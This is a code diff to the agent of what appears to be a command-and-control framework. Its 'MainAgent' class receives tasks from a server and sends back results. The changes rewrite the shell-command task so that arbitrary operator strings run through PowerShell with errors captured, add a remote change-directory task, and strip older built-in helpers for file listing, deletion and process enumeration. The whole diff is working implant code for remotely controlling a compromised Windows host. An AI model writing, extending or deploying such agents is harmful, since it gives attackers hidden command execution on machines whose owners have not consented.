@@ -3,16 +3,11 @@ import datetime
 import http.server
 import io
 import json
-import math
-import numbers
 import os
 import platform
 import queue as Queue
 import random
-import re
-import shutil
 import socket
-import stat
 import struct
 import subprocess
 import sys
@@ -49,16 +44,6 @@ from System.Management.Automation.Runspaces import RunspaceFactory
 ################################################
 moduleRepo = {}
 _meta_cache = {}
-
-def old_div(a, b):
-    """
-    Equivalent to ``a / b`` on Python 2 without ``from __future__ import
-    division``.
-    """
-    if isinstance(a, numbers.Integral) and isinstance(b, numbers.Integral):
-        return a // b
-    else:
-        return a / b
 
 
 ################################################
@@ -448,21 +433,37 @@ class MainAgent:
 
     def run_prebuilt_command(self, data, result_id):
         """
-        Run a command on the system and return the results.
+        Run a shell command on the system and return the results.
         Task 40
         """
-        parts = data.split(" ")
-        if len(parts) == 1:
-            data = parts[0]
-            result_data = str(self.run_command(data))
-            self.packet_handler.send_message(self.packet_handler.build_response_packet(40, result_data, result_id))
-        else:
-            cmd = parts[0]
-            cmdargs = " ".join(parts[1: len(parts)])
-            result_data = str(self.run_command(cmd, cmdargs=cmdargs))
-            self.packet_handler.send_message(self.packet_handler.build_response_packet(40, result_data, result_id))
-
+        if data.startswith("shell "):
+            data = data[len("shell "):]
+        result_data = str(self.run_command(data))
+        self.packet_handler.send_message(
+            self.packet_handler.build_response_packet(40, result_data, result_id)
+        )
         self.tasks[result_id]["status"] = "completed"
+
+    def change_directory(self, data, result_id):
+        """
+        Change the agent's working directory.
+        Task 44. On success returns the new cwd as TASK_CHDIR (44).
+        On OSError returns "[!] chdir failed: <err>" as ERROR (0) so the
+        server marks the task as errored and the operator sees red.
+        """
+        try:
+            os.chdir(data)
+            result_data = os.getcwd()
+            packet_type = 44
+            status = "completed"
+        except OSError as e:
+            result_data = "[!] chdir failed: {}".format(e)
+            packet_type = 0
+            status = "error"
+        self.packet_handler.send_message(
+            self.packet_handler.build_response_packet(packet_type, result_data, result_id)
+        )
+        self.tasks[result_id]["status"] = status
 
     def file_download(self, data, result_id):
         """
@@ -1283,170 +1284,26 @@ class MainAgent:
         httpServer.server_close()
         return
 
-    def permissions_to_unix_name(self, st_mode):
-        permstr = ""
-        usertypes = ["USR", "GRP", "OTH"]
-        for usertype in usertypes:
-            perm_types = ["R", "W", "X"]
-            for permtype in perm_types:
-                perm = getattr(stat, "S_I%s%s" % (permtype, usertype))
-                if st_mode & perm:
-                    permstr += permtype.lower()
-                else:
-                    permstr += "-"
-        return permstr
-
-    def directory_listing(self, path):
-        # directory listings in python
-        # https://www.opentechguides.com/how-to/article/python/78/directory-file-list.html
-
-        res = ""
-        for fn in os.listdir(path):
-            fstat = os.stat(os.path.join(path, fn))
-            permstr = self.permissions_to_unix_name(fstat[0])
-
-            if os.path.isdir(fn):
-                permstr = "d{}".format(permstr)
-            else:
-                permstr = "-{}".format(permstr)
-
-            user = Environment.UserName
-            # Needed?
-            group = "Users"
-
-            # Convert file size to MB, KB or Bytes
-            if fstat.st_size > 1024 * 1024:
-                fsize = math.ceil(old_div(fstat.st_size, (1024 * 1024)))
-                unit = "MB"
-            elif fstat.st_size > 1024:
-                fsize = math.ceil(old_div(fstat.st_size, 1024))
-                unit = "KB"
-            else:
-                fsize = fstat.st_size
-                unit = "B"
-
-            mtime = time.strftime("%X %x", time.gmtime(fstat.st_mtime))
-
-            res += "{} {} {} {:18s} {:f} {:2s} {:15.15s}\n".format(
-                permstr, user, group, mtime, fsize, unit, fn
-            )
-
-        return res
-
     # additional implementation methods
-    def run_command(self, command, cmdargs=None):
-        from System.Management.Automation import PowerShell, Runspaces
+    def run_command(self, command):
+        from System.Management.Automation import PowerShell
 
-        if re.compile("(ls|dir)").match(command):
-            if cmdargs == None or not os.path.exists(cmdargs):
-                cmdargs = "."
+        if not command:
+            return "no shell command supplied"
 
-            return self.directory_listing(cmdargs)
-        if re.compile("cd").match(command):
-            os.chdir(cmdargs)
-            return str(os.getcwd())
-        elif re.compile("pwd").match(command):
-            return str(os.getcwd())
-        elif re.compile("rm").match(command):
-            if cmdargs == None:
-                return "please provide a file or directory"
+        ps = PowerShell.Create()
+        # 2>&1 merges PowerShell's error stream into the success stream so
+        # non-terminating errors reach the operator instead of being dropped.
+        ps.AddScript(command + " 2>&1 | Out-String")
+        results = ps.Invoke()
+        output = "\n".join(str(r) for r in results)
 
-            if os.path.exists(cmdargs):
-                if os.path.isfile(cmdargs):
-                    os.remove(cmdargs)
-                    return "done."
-                elif os.path.isdir(cmdargs):
-                    shutil.rmtree(cmdargs)
-                    return "done."
-                else:
-                    return "unsupported file type"
-            else:
-                return "specified file/directory does not exist"
-        elif re.compile("mkdir").match(command):
-            if cmdargs == None:
-                return "please provide a directory"
+        if ps.HadErrors:
+            errors = "\n".join(str(e) for e in ps.Streams.Error)
+            if errors:
+                output = output + "\n[!] " + errors if output else "[!] " + errors
 
-            os.mkdir(cmdargs)
-            return "Created directory: {}".format(cmdargs)
-
-        elif re.compile("(whoami|getuid)").match(command):
-            return Environment.UserName
-
-        elif re.compile("hostname").match(command):
-            return str(socket.gethostname())
-
-        elif re.compile("ps").match(command):
-            myrunspace = Runspaces.RunspaceFactory.CreateRunspace()
-            myrunspace.Open()
-            pipeline = myrunspace.CreatePipeline()
-            pipeline.Commands.AddScript(
-                """
-                        $owners = @{}
-                        Get-WmiObject win32_process | ForEach-Object {
-                            try {
-                                $o = $_.getowner()
-                                if (-not $($o.User)) {
-                                    $o = 'N/A'
-                                } else {
-                                    $o = "$($o.Domain)\\$($o.User)"
-                                }
-                            } catch {
-                                $o = 'N/A'
-                            }
-                            $owners[$_.handle] = $o
-                        }
-                        $p = "*";
-                        $output = Get-Process $p | ForEach-Object {
-                            $arch = 'x64';
-                            if ([System.IntPtr]::Size -eq 4) {
-                                $arch = 'x86';
-                            }
-                            else{
-                                foreach($module in $_.modules) {
-                                    if([System.IO.Path]::GetFileName($module.FileName).ToLower() -eq "wow64.dll") {
-                                        $arch = 'x86';
-                                        break;
-                                    }
-                                }
-                            }
-                            $out = New-Object psobject
-                            $out | Add-Member Noteproperty 'ProcessName' $_.ProcessName
-                            $out | Add-Member Noteproperty 'PID' $_.ID
-                            $out | Add-Member Noteproperty 'Arch' $arch
-                            $out | Add-Member Noteproperty 'UserName' $owners[$_.id.tostring()]
-                            $mem = "{0:N2} MB" -f $($_.WS/1MB)
-                            $out | Add-Member Noteproperty 'MemUsage' $mem
-                            $out
-                        } | Sort-Object -Property PID | ConvertTo-Json;
-                        $output
-            """
-            )
-            results = pipeline.Invoke()
-            buffer = StringIO()
-            sys.stdout = buffer
-            for result in results:
-                print(result)
-            sys.stdout = sys.__stdout__
-            return_data = buffer.getvalue()
-            return return_data
-        else:
-            if cmdargs is None:
-                cmdargs = ""
-            full_command = "{} {}".format(command, cmdargs)
-
-            if full_command.lower().startswith("shell "):
-                full_command = full_command[6:].strip()
-
-            ps = PowerShell.Create()
-            ps.AddScript(full_command + " | Out-String")
-
-            results = ps.Invoke()
-
-            output = []
-            for result in results:
-                output.append(str(result))
-
-            return "\n".join(output)
+        return output
 
     def get_file_part(self, filePath, offset=0, chunkSize=512000, base64=True):
         if not os.path.exists(filePath):
@@ -1571,6 +1428,9 @@ class MainAgent:
 
             elif packet_type == 43:
                 self.directory_list(data, result_id)
+
+            elif packet_type == 44:
+                self.change_directory(data, result_id)
 
             elif packet_type == 50:
                 self.task_list(result_id)
